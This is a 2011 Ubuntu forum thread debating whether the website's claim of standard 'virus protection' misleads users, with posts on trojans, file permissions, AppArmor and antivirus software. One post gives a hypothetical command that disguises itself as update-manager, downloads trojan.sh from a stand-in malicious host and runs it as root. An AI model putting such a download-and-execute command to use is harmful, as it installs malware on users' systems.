---
title: "Ubuntu, Virus Protection Comes as Standard"
date: 2011-04-28
forum: Recurring Discussions
---

### Post by Ctrl-Alt-F1 on 2011-04-28
> You can surf in safety with Ubuntu – confident that your files and data will stay protected. A built-in firewall and [COLOR="DarkRed"]virus protection come as standard[/COLOR]. And if a potential threat appears, we provide automatic updates which you can install in a single click. You get added security with AppArmor, which protects your important applications so attackers can’t access your system. And thanks to Firefox and gnome-keyring, Ubuntu helps you keep your private information private. So whether it’s accessing your bank account or sharing sensitive data with friends or colleagues, you’ll have peace of mind when you need it the most.(red added for emphasis)

Really guys?  C'mon.

---

### Post by jerenept on 2011-04-28
> **Ctrl-Alt-F1 said:**
> (red added for emphasis)

Really guys?  C'mon.

Viruses? What viruses?

---

### Post by lisati on 2011-04-28
A significant portion of [malware]("http://lisati.homelinux.com/wiki/index.php/Malware") just won't work on Ubuntu unless you go to a lot of trouble to get it to work. Most of the rest needs the special genius of carelessness to work.

/me is tempted to move this thread to "Recurring discussions"

---

### Post by oldsoundguy on 2011-04-28
This form of language is directed at Windows users as most of them don't believe that an operating system can be virus resistant to the point of not needing a 3rd party program to protect the system.  It is beyond the thinking of a LOT of Windows users that equate Windows viruses as total COMPUTER viruses and the media that reports the attacks over and over NEVER mention that those attacks are Windows centric.

---

### Post by Ctrl-Alt-F1 on 2011-04-28
I just don't think it's very forthcoming.  Linux is susceptible to viruses, just like any OS is.  I laughed when I saw this on the 11.04 page.  Way to encourage sloppy web practices.

---

### Post by oldsoundguy on 2011-04-28
> **Ctrl-Alt-F1 said:**
> I just don't think it's very forthcoming.  Linux is susceptible to viruses, just like any OS is.  I laughed when I saw this on the 11.04 page.  Way to encourage sloppy web practices.


Wrong!! To put any malware into your KERNEL requires root privileges.  Unless you are dumber than a ditch, not happening .. especially Ubuntu that really makes getting into root a real task.

---

### Post by jerenept on 2011-04-28
> **oldsoundguy said:**
> Wrong!! To put any malware into your KERNEL requires root privileges.  Unless you are dumber than a ditch, not happening .. especially Ubuntu that really makes getting into root a real task.

Of course, considering that Ubuntu takes all of 45 min to an hour to install, I mainly care about what's in ~/

And, a malicious .deb (or PPA) can cause a lot of damage.

---

### Post by uRock on 2011-04-28
What do we need an anti-virus for. It is only needed for servers and people sharing files with Windows.

It isn't hard to install bitdefender and let it roll, if one so feels that it is needed.

---

### Post by slooksterpsv on 2011-04-28
Where'd you find that at?

I like this page: [http://www.ubuntu.com/ubuntu/why-use-ubuntu](http://www.ubuntu.com/ubuntu/why-use-ubuntu) =D

---

### Post by NMFTM on 2011-04-28
> **oldsoundguy said:**
> Wrong!! To put any malware into your KERNEL requires root privileges.  Unless you are dumber than a ditch, not happening .. especially Ubuntu that really makes getting into root a real task.
Sudo/su <whatever>.

---

### Post by tgm4883 on 2011-04-28
> **oldsoundguy said:**
> Wrong!! To put any malware into your KERNEL requires root privileges.  Unless you are dumber than a ditch, not happening .. especially Ubuntu that really makes getting into root a real task.

Actually no, any malicious software only needs to get running as the user and be patient. Whether that is through social engineering or via a browser exploit it just needs to run with user privileges. From there it is a short jump to root privileges on most standard Ubuntu installs.

I'm against the wording of that on the feature page. Word it differently, but don't lie about it.

---

### Post by tgm4883 on 2011-04-28
> **slooksterpsv said:**
> Where'd you find that at?

I like this page: [http://www.ubuntu.com/ubuntu/why-use-ubuntu](http://www.ubuntu.com/ubuntu/why-use-ubuntu) =D

It's on this page
[http://www.ubuntu.com/ubuntu/features](http://www.ubuntu.com/ubuntu/features)

---

### Post by Timmer1240 on 2011-04-28
Running Linux I feel way safer than in windows I know its probably not bulletproof but Im pretty careful about where I download software from.From what I understand you have to give your password to any program to be installed so the user would have to help the thing install.

---

### Post by tjwoosta on 2011-04-28
Most average users would consider virus to be synonymous with trojan, especially coming from the windows world.

Telling them linux doesnt have viruses makes them think theyre invulnerable to all malware. Not a very nice thing to do. Good for marketing maybe, but not whats best for the user.

---

### Post by _outlawed_ on 2011-04-28
All it takes is someone with your password to make your system a living hell.

---

### Post by Telengard C64 on 2011-04-28
> **tgm4883 said:**
> Actually no, any malicious software only needs to get running as the user and be patient. Whether that is through social engineering or via a browser exploit it just needs to run with user privileges. From there it is a short jump to root privileges on most standard Ubuntu installs.

I'm against the wording of that on the feature page. Word it differently, but don't lie about it.

Actually I agree with you. Can you please explain in detail, with links as required for references, exactly how (for example) **~/.inetapp/cache/malicious_script** can obtain root access? 

I don't know about everyone else here, but I don't store my most sensitive/important files in the kernel or in root protected folders. I store them in **~/** (my home folder). Any malicious program or script which finds its way onto my computer can presumably access the same data I can.

---

### Post by slooksterpsv on 2011-04-28
> **Telengard C64 said:**
> Actually I agree with you. Can you please explain in detail, with links as required for references, exactly how (for example) **~/.inetapp/cache/malicious_script** can obtain root access? 

I don't know about everyone else here, but I don't store my most sensitive/important files in the kernel or in root protected folders. I store them in **~/** (my home folder). Any malicious program or script which finds its way onto my computer can presumably access the same data I can.

Umm.... how about....
malicious_script = update-manager and runs:
gksudo update-manager && wget -c [http://some.bad.malware.com/trojan.sh](http://some.bad.malware.com/trojan.sh) && gksudo /bin/bash `pwd`/trojan.sh

So you think it's update-manager just wanting updates? I dunno if that technically would work, but still.

---

### Post by ErikNJ on 2011-04-28
It's a very bad idea to provide a false sense of security to new Linux users.  While Ubuntu Linux is very secure, it's not flawless.  That statement quoted in this post is misleading (I understand its intention but it needs to be reworded).

Of course, the whole reason for Mandatory Access Control (MAC) software like SELinux or Apparmor, is to provide protection against possible security vulnerabilities before they are patch (zero day).  While Ubuntu does include Apparmor by default, there are very few default policies.  With MAC, you can create custom policies where applications can only talk to other programs that they've been given permission.

...one of these days, I hope to dig into Apparmor and SELinux and better understand how to create policies for either of them.  It's because I KNOW that there is still a chance of exploit even on Linux and extra protection is still a good idea.

---

### Post by simpleblue on 2011-04-28
As far as my experience is concerned I have to say that Ubuntu is correct in their statement, even though it may not seem true.

I've been using Linux for about 2 years and I have not yet seen anything even remotely like a virus. Not on my computer, or even in the forums, have I heard about someone getting a virus. I've been on all kinds of sites that would likely give have viruses, and have even purposely went to sites that have poor ratings and are said to be virus prone and I've been fine.

At the most I'll get pop-ups asking me to click 'yes' or 'no' and I click them to see if a virus will install. I wait for the day when I get infected, and if I do, it's only an hour at most to re-install Ubuntu and activate Ubuntu One and my synced Google Chrome and it's like new. :p

---

### Post by Paqman on 2011-04-28
Look, I don't think anyone here will disagree that one of desktop Linux's strengths is security, and that Ubuntu should point that out as an advantage to potential users.

Are we actually going to have a great big discussion about the exact choice of wording on the website? Really?

---

### Post by slooksterpsv on 2011-04-28
> **Paqman said:**
> Look, I don't think anyone here will disagree that one of desktop Linux's strengths is security, and that Ubuntu should point that out as an advantage to potential users.

Are we actually going to have a great big discussion about the exact choice of wording on the website? Really?

Personally I think its more for Windows users than anything. They think any OS can get a virus, which is technically true, Android, Mac OS X, Windows, etc.

So where Linux really doesn't get viruses (at least not as bad as the others) it's best to state that it includes protection against it, which AppArmor does help. So people have piece of mind.

---

### Post by tgm4883 on 2011-04-28
> **Telengard C64 said:**
> Actually I agree with you. Can you please explain in detail, with links as required for references, exactly how (for example) **~/.inetapp/cache/malicious_script** can obtain root access? 

I don't know about everyone else here, but I don't store my most sensitive/important files in the kernel or in root protected folders. I store them in **~/** (my home folder). Any malicious program or script which finds its way onto my computer can presumably access the same data I can.

Sure, I've posted earlier with proof of concept code. It's a simple bash script but works.

[http://ubuntuforums.org/showpost.php?p=10491993&postcount=26](http://ubuntuforums.org/showpost.php?p=10491993&postcount=26)

> **Paqman said:**
> Look, I don't think anyone here will disagree that one of desktop Linux's strengths is security, and that Ubuntu should point that out as an advantage to potential users.

Are we actually going to have a great big discussion about the exact choice of wording on the website? Really?

If it's misleading then yes.

---

### Post by Paqman on 2011-04-28
> **tgm4883 said:**
> 
If it's misleading then yes.

What's misleading about it?

---

### Post by PhillyPhil on 2011-04-28
> **jerenept said:**
> Of course, considering that Ubuntu takes all of 45 min to an hour to install, I mainly care about what's in ~/

And, a malicious .deb (or PPA) can cause a lot of damage.

? Takes me about 15-20 minutes...> **Ctrl-Alt-F1 said:**
>   Linux is susceptible to viruses, just like any OS is. 

In theory, sure, but in practice we're virus free...

---

### Post by Telengard C64 on 2011-04-28
> **slooksterpsv said:**
> So where Linux really doesn't get viruses (at least not as bad as the others) it's best to state that it includes protection against it, which AppArmor does help.

Sounds great. Can you please explain how the default configuration of AppArmor in Ubuntu protects me from viruses?

---

### Post by jerenept on 2011-04-28
> **PhillyPhil said:**
> ? Takes me about 15-20 minutes...
My computer is old and slow.
> In theory, sure, but in practice we're virus free...
In practice, you are being nonchalant about security and will pay dearly.

---

### Post by szymon_g on 2011-04-29
> **Telengard C64 said:**
> Actually I agree with you. Can you please explain in detail, with links as required for references, exactly how (for example) **~/.inetapp/cache/malicious_script** can obtain root access? 

I don't know about everyone else here, but I don't store my most sensitive/important files in the kernel or in root protected folders. I store them in **~/** (my home folder). Any malicious program or script which finds its way onto my computer can presumably access the same data I can.

well... AFAIK ubuntu won't protect you against that... to do that, you have to use distribution with more security-focused, like Fedora with SELinux- thanx that, you have much better chances to "survive" attack like that

---

### Post by PhillyPhil on 2011-04-29
> **jerenept said:**
>  In practice, you are being nonchalant about security and will pay dearly.

Extremely unlikely.

---

### Post by Telengard C64 on 2011-04-29
> **tgm4883 said:**
> Sure, I've posted earlier with proof of concept code. It's a simple bash script but works.
[http://ubuntuforums.org/showpost.php?p=10491993&postcount=26](http://ubuntuforums.org/showpost.php?p=10491993&postcount=26)

Thanks for that. I'll reply there instead of cross-pollinating with this thread.

---

### Post by iponeverything on 2011-04-29
> In practice, you are being nonchalant about security and will pay dearly. 

Que the scary music.

I'm glad I don't have worry about viruses and maleware, I have other things on my plate..

personal experience:
I've used solely linux since the .99 kernel on slackware in '93 -- never had an issue with virus or maleware. I managed hundreds of linux servers, still never a virus or maleware. It's not luck, there has never been outbreak -- 

viruses and maleware have not found exploitable vectors in linux for transmission. I am confident that it not because of lack of trying.

---

### Post by szymon_g on 2011-04-29
> **PhillyPhil said:**
> Extremely unlikely.

i wouldn't say "extremely"

---

### Post by PhillyPhil on 2011-04-29
> **szymon_g said:**
> i wouldn't say &quot;extremely&quot;

I would.  Linux viruses don't currently even exist in the wild, and the separation between user and kernel space *is* another very effective layer of protection, even if it isn't impregnable.
Not to mention the security benefits of open source.

---

### Post by szymon_g on 2011-04-29
... and despite that, in most distribution, compromised firefox or any other program that somehow communicate via internet can read your private ssh keys or destroy content of Documents directory (i know it's unlikely, but it is possible)

---

### Post by PhillyPhil on 2011-04-29
> **szymon_g said:**
> ... and despite that, in most distribution, compromised firefox or any other program that somehow communicate via internet can read your private ssh keys or destroy content of Documents directory (i know it's unlikely, but it is possible)

You're dragging me into another topic. 
I'm here(and staying here): the chances of me getting a virus (no matter how nonchalant) are extremely unlikely.  
In fact 'extremely' may not even be quite strong enough to convey how low the likelyhood is.

---

### Post by uRock on 2011-04-29
> **szymon_g said:**
> ... and despite that, in most distribution, compromised firefox or any other program that somehow communicate via internet can read your private ssh keys or destroy content of Documents directory (i know it's unlikely, but it is possible)

AppArmor is installed and profiles for Firefox should be set to enforce by default.

```
*****@******:~$ sudo apparmor_status
[sudo] password for ******: 
apparmor module is loaded.
78 profiles are loaded.
16 profiles are in enforce mode.
   /sbin/dhclient3
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-thumbnailer
   /usr/bin/freshclam
   /usr/lib/NetworkManager/nm-dhcp-client.action
   /usr/lib/chromium-browser/chromium-browser//browser_java
   /usr/lib/chromium-browser/chromium-browser//browser_openjdk
   /usr/lib/connman/scripts/dhclient-script
   /usr/lib/cups/backend/cups-pdf
   /usr/lib/firefox-4.0/firefox{,*[^s][^h]}
   /usr/lib/firefox-4.0/firefox{,*[^s][^h]}//browser_java
   /usr/lib/firefox-4.0/firefox{,*[^s][^h]}//browser_openjdk
   /usr/sbin/cupsd
   /usr/sbin/tcpdump
   /usr/share/gdm/guest-session/Xsession

```

AV is not needed for this, but the user needs to install and adjust profiles for browsers and such if there is not one in place for network facing applications.

I say that because I recently installed Chromium and noticed that the following rules/definitions are set to complain, which means I have to check the logs to see if there have been any violations and to see if these rules are throwing off any false complaints.```
62 profiles are in complain mode.
   /bin/ping
   /sbin/klogd
   /sbin/syslog-ng
   /sbin/syslogd
   /usr/lib/chromium-browser/chromium-browser
   /usr/lib/chromium-browser/chromium-browser//chromium_browser_sandbox
   /usr/lib/chromium-browser/chromium-browser//null-28
   /usr/lib/chromium-browser/chromium-browser//null-29
   /usr/lib/chromium-browser/chromium-browser//null-2a
   /usr/lib/chromium-browser/chromium-browser//null-2b
   /usr/lib/chromium-browser/chromium-browser//null-2c
   /usr/lib/chromium-browser/chromium-browser//null-2d
   /usr/lib/chromium-browser/chromium-browser//null-2e
   /usr/lib/chromium-browser/chromium-browser//null-2f
   /usr/lib/chromium-browser/chromium-browser//null-30
   /usr/lib/chromium-browser/chromium-browser//null-31
   /usr/lib/chromium-browser/chromium-browser//null-32
   /usr/lib/chromium-browser/chromium-browser//null-33
   /usr/lib/chromium-browser/chromium-browser//null-34
   /usr/lib/chromium-browser/chromium-browser//null-35
   /usr/lib/chromium-browser/chromium-browser//null-36
   /usr/lib/chromium-browser/chromium-browser//null-37
   /usr/lib/chromium-browser/chromium-browser//null-38
   /usr/lib/chromium-browser/chromium-browser//null-39
   /usr/lib/chromium-browser/chromium-browser//null-3a
   /usr/lib/chromium-browser/chromium-browser//null-3b
   /usr/lib/chromium-browser/chromium-browser//null-3c
   /usr/lib/chromium-browser/chromium-browser//null-3d
   /usr/lib/chromium-browser/chromium-browser//null-3e
   /usr/lib/chromium-browser/chromium-browser//null-3f
   /usr/lib/chromium-browser/chromium-browser//null-40
   /usr/lib/chromium-browser/chromium-browser//null-41
   /usr/lib/chromium-browser/chromium-browser//null-42
   /usr/lib/chromium-browser/chromium-browser//null-43
   /usr/lib/chromium-browser/chromium-browser//null-44
   /usr/lib/chromium-browser/chromium-browser//null-45
   /usr/lib/chromium-browser/chromium-browser//null-46
   /usr/lib/chromium-browser/chromium-browser//null-47
   /usr/lib/chromium-browser/chromium-browser//null-48
   /usr/lib/chromium-browser/chromium-browser//null-49
   /usr/lib/chromium-browser/chromium-browser//null-4a
   /usr/lib/chromium-browser/chromium-browser//null-4b
   /usr/lib/chromium-browser/chromium-browser//null-4c
   /usr/lib/chromium-browser/chromium-browser//null-4d
   /usr/lib/chromium-browser/chromium-browser//null-4e
   /usr/lib/chromium-browser/chromium-browser//null-4f

```

---

### Post by wizard10000 on 2011-04-29
> **Paqman said:**
> What's misleading about it?

>  A built-in firewall and virus protection come as standard.

Firewall yes, but IMO the "virus protection" claim is disingenuous.

I'd be interested in learning what virus protection "comes as standard" with Ubuntu.  There are virus scanners available but they only scan for Windows viruses and none of them come installed by default.

---

### Post by disabledaccount on 2011-04-29
My statistics look like this:
12-14 years using windows:
- w95: not an operating system really - it does not count :)
- w98/ME: zero protection, in fact the system could destroy itself, without help of virus - it was hard task to maintain it working for more than ~6months :)
- windows XP: until SP2 it was one huge security hole, but if wisely (very, very carefully) used it could work for several years without reinstall. I've catched maybe 3 or 4 "binary" viruses on my XP boxes in all my history - mainly trough digital cameras and/or usb sticks. Additionally maybe 2 or 3 doc macro viruses, removed manually. I was using AV all the time and additionally FireWall with very tight rules (not MS Fire Wall, wihich was/is an april joke software)
I do not have much experience with viruses on Vista and W7, because I've dropped support for windows after I've seen Vista nightmare - or "candy monster" as someone called it :)

I know linux for 10 years, but my first linux box was home server, built about 6 years ago, 3 years ago I've built new one using new hw - zero problems with viruses (and zero problems with slowing down over the time) - running almost without breaks 365d/6years.
Desktop: 
I 'm using linux desktops for ~3 years now: zero viruses, malware/trojans etc. no AV, Firewall with default settings + blocking incoming connections.

The biggest weakness of windows is that it uses a lot of threads (because bloated system needs maxium speed) - what makes code/data injection very easy and also this is main reason for security holes at all. On linux most important components are running within separate processes - so their data and code is protected.

---

### Post by MrNatewood on 2011-04-29
Lying about your software's features is bad. period. There is no anti-virus installed in Ubuntu by default, as indeed there shouldn't be.

If someone is to write a working virus for linux no one should expect to be protected only because he is using Ubuntu.

Maybe they are hinting to some other mechanism such as SElinux, AppArmor or whatever Ubuntu is using.

Even if they are hinting to that it feels deeply dishonest to me.

---

### Post by ssam on 2011-04-29
ubuntu has a large number of security features:
[https://wiki.ubuntu.com/Security/Features](https://wiki.ubuntu.com/Security/Features)

antivirus software just looks for a list of known threats. suppose there is a exploitable bug in the kernel, antivirus just keeps a list of things known to exploit that bug. the best thing is to rapidly fix the bug.

---

### Post by Lucradia on 2011-04-29
> **Ctrl-Alt-F1 said:**
> I just don't think it's very forthcoming.  Linux is susceptible to viruses, just like any OS is.  I laughed when I saw this on the 11.04 page.  Way to encourage sloppy web practices.

plus one

---

### Post by Johnsie on 2011-04-29
You dont need root to quietly add something to a local users startup scripts, send emails or to do tcp/ip stuff. Ubuntu is definitely safer, but not completey without risk. 

See here for more info:
[http://ubuntu.com/usn](http://ubuntu.com/usn)

Alot of exploits are being found and patched all the time, some of them quite serious. It's just a matter of how many people are abusing those exploits and how quickly they are being found, not whether or not they exist. From the USN you can be sure that they DO exist, but you cannot be sure how many have been found by honest people.

---

### Post by Simian Man on 2011-04-29
That is extremely dishonest.  The fact that nobody is currently shooting at you doesn't make you bulletproof.

---

### Post by weasel fierce on 2011-04-29
> **Simian Man said:**
> That is extremely dishonest.  The fact that nobody is currently shooting at you doesn't make you bulletproof.

This is true. But that doesn't mean you shouldn't be sitting in a bunker to begin with :)

---

### Post by Telengard C64 on 2011-04-29
This thread seems to be meandering about a bit. To be clear, here's what OP was referring to, and what we should be discussing.

[http://www.ubuntu.com/ubuntu/features](http://www.ubuntu.com/ubuntu/features)

> Secure

You can surf in safety with Ubuntu &#8211; confident that your files and data will stay protected. A built-in firewall and _virus protection come as standard_. And if a potential threat appears, we provide automatic updates which you can install in a single click. You get added security with AppArmor, which protects your important applications so attackers can&#8217;t access your system. And thanks to Firefox and gnome-keyring, Ubuntu helps you keep your private information private. So whether it&#8217;s accessing your bank account or sharing sensitive data with friends or colleagues, you&#8217;ll have peace of mind when you need it the most.

    * Automatic security updates
    * _Defence against viruses_
    * Anti-phishing

    * File encryption
    * Password protection
    * Built with security in mind

I'd feel a heck of a lot better about this if they would just state explicitly what they mean by this. What exactly is the **defence against viruses** which **comes as standard** in Ubuntu.

Notice that **AppArmor** is mentioned *separately* from **virus protection**. That suggests that the phrase **virus protection** should be referring to something else.

If they are referring to Unix permissions, then ... well ... *every Linux distro has that protection*. That means Unix permissions don't differentiate Ubuntu from any other Unix-like operating system.

As has already been mentioned in this thread, there are anit-virus solutions available for Ubuntu, but I'm not aware of any of them which **come as standard**.

For me, here's what it boils down to. As a Linux system administrator it is my duty to evaluate and implement security  measures on my systems. If Ubuntu claims to have **virus protection**, then I need to know exactly what that is. That is the only way I can evaluate its fitness for my purposes and maintain it as necessary.

I think any reasonable administrator or security expert would agree that depending on automated security measures without understanding how they work is folly. I want to know exactly what my **virus protection** is and how it works.

---

### Post by jdunn on 2011-04-29
I use BitDefender, which IMO is the best virus scanner for Linux (32 or 64 bit).  Having said that, Linux does not need anti-virus software unless you have one or more of the following use-cases:  You want to protect Windows apps that you're running in Wine. You have a dual-boot system and/or transfer files back and forth between an MS Windows operating system (in this case, a Linux virus scanner is an extra level of protection against infecting a Windows OS).

---

### Post by disabledaccount on 2011-04-29
> **Telengard C64 said:**
> I'd feel a heck of a lot better about this if they would just state explicitly what they mean by this. What exactly is the **defence against viruses** which **comes as standard** in Ubuntu.
Have You looked at this?
> **ssam said:**
> ubuntu has a large number of security features:
[https://wiki.ubuntu.com/Security/Features](https://wiki.ubuntu.com/Security/Features)
These comes as standard with every linux distro - including Ubuntu. So - can they claim that Ubuntu is protected against viruses in many ways? Of course they can - it's not a lie.

A word about AV: AV is a virus itself - it's not a joke - AV software uses the same techniqes as viruses with the only difference that it is supposed to protect the user. This leads to very important conclusion: if operating system allows to install system-wide hooks for its most vital functions, then real virus can do it as well. So it's far better solution to prevent possibility of making hooks and memory corruptions/injections - this will work allways, even for zero-day attacks.
Of course viruses in scripts need a bit different approach, but it still leads to removing security holes.

---

### Post by Telengard C64 on 2011-04-29
> **tomazzi said:**
> Have You looked at this?

The word **virus** doesn't appear anywhere on that page, and therefore I don't believe the quoted paragraph is intended to refer to anything on that page. I do agree though that the feature page does detail many good security features of Ubuntu which would greatly inhibit the effectiveness of potential virus-like behavior.

> it's not a lie.

I haven't said that it was a lie. I only wish the information in the quoted paragraph were more specific. Honestly, I'd even be satisfied if when they said **virus protection** they linked to the security features page which you pointed out. But they didn't, and that is a problem for me.

> A word about AV: AV is a virus itself - it's not a joke - AV software uses the same techniqes as viruses with the only difference that it is supposed to protect the user. This leads to very important conclusion: if operating system allows to install system-wide hooks for its most vital functions, then real virus can do it as well. So it's far better solution to prevent possibility of making hooks and memory corruptions/injections - this will work allways, even for zero-day attacks.
Of course viruses in scripts need a bit different approach, but it still leads to removing security holes.

The more I read you folks saying things like this, the more convinced I am that I really do need AV software. While I am convinced that Ubuntu is far more secure than Windows (not even a contest here), there is no such thing as a perfect impregnable software fortress in modern computer systems.

---

### Post by disabledaccount on 2011-04-29
> **Telengard C64 said:**
> The more I read you folks saying things like this, the more convinced I am that I really do need AV software. While I am convinced that Ubuntu is far more secure than Windows (not even a contest here), there is no such thing as a perfect impregnable software fortress in modern computer systems.Modern computer systems are very complicated. There is no simple answer. There is no simple solution - that's why good admins earns so much money...

---

### Post by Paqman on 2011-04-30
> **wizard10000 said:**
> Firewall yes, but IMO the "virus protection" claim is disingenuous.

I'd be interested in learning what virus protection "comes as standard" with Ubuntu.  There are virus scanners available but they only scan for Windows viruses and none of them come installed by default.

"Virus protection" doesn't have to mean a virus scanner. It can mean any of the numerous security features built into Linux that inhibit the action of viruses. File permissions would be a good example.

---

### Post by jerenept on 2011-04-30
> **Paqman said:**
> "Virus protection" doesn't have to mean a virus scanner. It can mean any of the numerous security features built into Linux that inhibit the action of viruses. **File permissions would be a good example**.

Because there is no such thing in Windows and OSX?

---

### Post by disabledaccount on 2011-04-30
> **jerenept said:**
> Because there is no such thing in Windows and OSX?Because there is *huge* difference between what can offer windows and *nixes. You of course don't know nothing about it, thats why You have written the above "briliant" sentence.
Just one example: in NTFS "executable" and "readable" permissions cannot be splitted while in *nixes in every existing filesystem this is possible. This trivial difference allows to override many limits set it group policy and You need 3-rd party (paid) software to add some security functions.

---

### Post by tgm4883 on 2011-04-30
> **tomazzi said:**
> Because there is *huge* difference between what can offer windows and *nixes. You of course don't know nothing about it, thats why You have written the above "briliant" sentence.
Just one example: in NTFS "executable" and "readable" permissions cannot be splitted while in *nixes in every existing filesystem this is possible. This trivial difference allows to override many limits set it group policy and You need 3-rd party (paid) software to add some security functions.

I think his point was that permissions exist on OSX and Windows, so it's not something unique to Linux. You may also want to look into ACLs, which are very similar to Windows permissions and something that IIRC some Linux distro's are working toward. 

File system permissions do not count as virus protection.

---

### Post by aysiu on 2011-04-30
> **tjwoosta said:**
> Most average users would consider virus to be synonymous with trojan, especially coming from the windows world. It's not a simple matter of semantics. The two are fundamentally conceptually different. It's like telling people there's some burglar with a powerful battering ram that can bash through your front door when really the burglar's just ringing people's doorbells and saying "Hey, can you open up?" and people are actually opening up.

> Telling them linux doesnt have viruses makes them think theyre invulnerable to all malware. Not a very nice thing to do. Good for marketing maybe, but not whats best for the user. Telling people "antivirus" protects them from viruses is equally irresponsible. Almost every Windows user I know thinks they don't have to understand anything about security as long as they have "antivirus" installed.

> **tgm4883 said:**
> Sure, I've posted earlier with proof of concept code. It's a simple bash script but works.

[http://ubuntuforums.org/showpost.php?p=10491993&postcount=26](http://ubuntuforums.org/showpost.php?p=10491993&postcount=26) Sounds great, but it requires you to run a bash script. Is this really about a trojan or a virus? A trojan can thrive on any platform, as long as you can trick the user into running it.

> **MrNatewood said:**
> Lying about your software's features is bad. period. There is no anti-virus installed in Ubuntu by default, as indeed there shouldn't be. It said *virus protection*, not *antivirus software*. The two are actually almost the complete opposite.

---

### Post by Hyporeal on 2011-04-30
> **tgm4883 said:**
> File system permissions do not count as virus protection.

I don't see why not. If ineffectual virus scanners count then something with real security merit like file permissions ought to count as well.

The "virus protection" bit is just a vague marketing statement for the lay person. Nevertheless, nothing is hidden. Anyone who is serious about security can access information about the full range of protections afforded by Ubuntu. This is a non-issue.

---

### Post by tgm4883 on 2011-04-30
> **aysiu said:**
> It's not a simple matter of semantics. The two are fundamentally conceptually different. It's like telling people there's some burglar with a powerful battering ram that can bash through your front door when really the burglar's just ringing people's doorbells and saying "Hey, can you open up?" and people are actually opening up.


Yet the person is still getting robbed. I don't think they really care how the burglar got in. Or are you saying they should never open their front door.

> **aysiu said:**
> 
 Telling people "antivirus" protects them from viruses is equally irresponsible. Almost every Windows user I know thinks they don't have to understand anything about security as long as they have "antivirus" installed.


Agreed, AV software isn't everything. You also need good security practices.

> **aysiu said:**
> 
 Sounds great, but it requires you to run a bash script. Is this really about a trojan or a virus? A trojan can thrive on any platform, as long as you can trick the user into running it.


You are totally forgetting where I said I found past Firefox vulnerabilities that allowed an attacker to run code on your machine. I found these in Ubuntu security bulletins, and there is no reason why an attacker couldn't find these first.

> **aysiu said:**
> 
 It said *virus protection*, not *antivirus software*. The two are actually almost the complete opposite.

I disagree, what virus protection does Ubuntu offer? If you are married and don't cheat does that mean you have Aids protection?


I know the differences between a virus and a trojan, however most users do not (nor do they care, an infected machine is still infected). We aren't debating that because *technically* it isn't lying (since viruses are technically different than trojans). You don't have to lie to be dishonest though. This feature page is directed at new, less technical users (as is Ubuntu). It would be better if they tried to explain the difference or said what they meant. 

Doing things because you *technically* can is great and all, but if you are being disingenuous you are going to **** some people off (see Banshee Amazon MP3 payment fiasco)

---

### Post by aysiu on 2011-04-30
> **tgm4883 said:**
> Yet the person is still getting robbed. I don't think they really care how the burglar got in. Or are you saying they should never open their front door. I'm saying don't try to sell them on how strong you can make the door against physical destruction of the door if they're just going to open the door anyway for anyone who walks up to it.


> Agreed, AV software isn't everything. You also need good security practices. That's where I disagree. I see AV software and good security practices as polar opposites, except in very special situations.

> You are totally forgetting where I said I found past Firefox vulnerabilities that allowed an attacker to run code on your machine. I found these in Ubuntu security bulletins, and there is no reason why an attacker couldn't find these first. So why don't the attackers attack? I've been using Firefox in Windows since 2004. I've seen plenty of JavaScript and cross-site scripting vulnerabilities published, and I've never seen them fully exploited. Mozilla is pretty good about patching things, but they don't patch them immediately. It usually takes them a few days or even a few weeks.

> I know the differences between a virus and a trojan, however most users do not (nor do they care, an infected machine is still infected). We aren't debating that because *technically* it isn't lying (since viruses are technically different than trojans). You don't have to lie to be dishonest though. This feature page is directed at new, less technical users (as is Ubuntu). It would be better if they tried to explain the difference or said what they meant.  I agree. The page is misleading and irresponsible. But, as I explained before, the difference between a virus and a trojan is huge. It isn't a simple matter of semantics. Users need to know the difference. They cannot reasonably expect any OS to protect them against trojans.

---

### Post by tgm4883 on 2011-04-30
> **Hyporeal said:**
> I don't see why not. If ineffectual virus scanners count then something with real security merit like file permissions ought to count as well.


Ineffectual? Explain. 

There is nothing in Linux file system permissions that give you more security over other properly administered OS's, and there is nothing in file system permissions that would prevent a virus from running and 

1) destroying all of your important data (keep in mind that important data is usually kept in your home folder, and the threat would run as your user)
2) making connections to the internet
3) listening for connections on the internet
4) uploading/downloading files to/from the internet
4) logging all of your keystrokes
5) waiting for you to use sudo and then having full admin access to your machine

> **Hyporeal said:**
> 
The "virus protection" bit is just a vague marketing statement for the lay person. Nevertheless, nothing is hidden. Anyone who is serious about security can access information about the full range of protections afforded by Ubuntu. This is a non-issue.

The "virus protection" bit is just a vague marketing statement for the lay person. Nevertheless, nothing is hidden. Anyone who is serious about security can access information about the full range of protections afforded by Ubuntu. This is an issue because the lay person will think they are protected from threats, and not look any deeper into security.

Thanks for kinda making my point for me :D

---

### Post by tgm4883 on 2011-04-30
> **aysiu said:**
> So why don't the attackers attack? I've been using Firefox in Windows since 2004. I've seen plenty of JavaScript and cross-site scripting vulnerabilities published, and I've never seen them fully exploited. Mozilla is pretty good about patching things, but they don't patch them immediately. It usually takes them a few days or even a few weeks.

It's a guess, but I'm going to go out on a limb and say

*) You don't go to those types of sites that are trying to infect you
*) You did, but they were geared toward infecting Windows machines (the code that was run on your machine was infected)
*) There are Linux users out there that are infected and don't know they are infected. After all, the reason behind people writing threats is usually money not destruction. So one would think they would make the threat as low impact and least intrusive as possible.

---

### Post by aysiu on 2011-04-30
> **tgm4883 said:**
> It's a guess, but I'm going to go out on a limb and say

*) You don't go to those types of sites that are trying to infect you
*) You did, but they were geared toward infecting Windows machines (the code that was run on your machine was infected)
*) There are Linux users out there that are infected and don't know they are infected. After all, the reason behind people writing threats is usually money not destruction. (By the way, the third point doesn't mean anything. If people don't know their machines are infected, what's the point of talking about them being infected? Smug antivirus users also don't know when they're infected. "Antivirus" isn't god. It doesn't know of every type of malware in existence.) So one would think they would make the threat as low impact and least intrusive as possible. Okay. But I never said Linux is invincible. I'm just looking at it from a practical standpoint and trying to get people to see a reasonable middle ground. The two extremes I see (and this is both in Windows v. Mac discussions and Windows v. Linux discussions) are 1) Mac/Linux is invicible and 2) Mac/Linux is just as vulnerable to attacks as Windows.

Or, worse yet, 3) Because there is any kind of malware (usually a trojan) on Mac/Linux, that means people should install "antivirus" software.

